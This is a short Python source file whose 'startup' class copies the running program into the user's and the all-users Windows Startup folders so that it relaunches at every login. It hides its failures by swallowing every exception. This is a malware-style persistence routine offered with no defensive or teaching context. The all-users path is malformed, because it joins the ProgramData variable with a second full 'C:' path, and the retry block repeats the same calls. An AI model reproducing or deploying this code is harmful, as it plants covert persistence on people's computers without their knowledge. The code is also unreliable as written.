class startup():
    def start_up():
        import shutil
        import os
        from sys import argv
        
        roaming = os.getenv("appdata")
        prgdata = os.getenv("programdata")
        startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        common_startup_loc = prgdata + "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"
    
        try:
            shutil.copy2(argv[0], startup_loc)
            shutil.copy2(argv[0], common_startup_loc)
        except Exception:
            try:
                shutil.copy2(argv[0], startup_loc)
                shutil.copy2(argv[0], common_startup_loc)
            except Exception:
                pass
            
    start_up()